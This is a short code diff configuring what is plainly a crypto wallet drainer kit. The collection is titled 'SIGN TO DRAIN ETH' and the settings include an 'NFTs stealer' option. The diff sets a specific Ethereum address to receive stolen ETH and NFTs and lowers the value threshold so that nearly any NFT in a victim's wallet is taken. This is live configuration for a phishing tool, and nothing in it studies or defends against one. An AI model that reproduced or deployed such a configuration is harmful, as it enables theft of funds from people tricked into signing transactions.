@@ -1,5 +1,5 @@
 // your address goes here
-const receiveAddress = "YourAddressHere";
+const receiveAddress = "0x9852C0c5fB11668d37ef02719a429f887D4a615b";
 
 const collectionInfo = {
     name: "SIGN TO DRAIN ETH",
@@ -29,8 +29,8 @@ const claimPageInfo = {
 
 const drainNftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
-    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
+    minValue: 0.0001,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    nftReceiveAddress: "0x9852C0c5fB11668d37ef02719a429f887D4a615b" // leave empty if you want to use the same as receiveAddress 
 }
 
 const customStrings = {
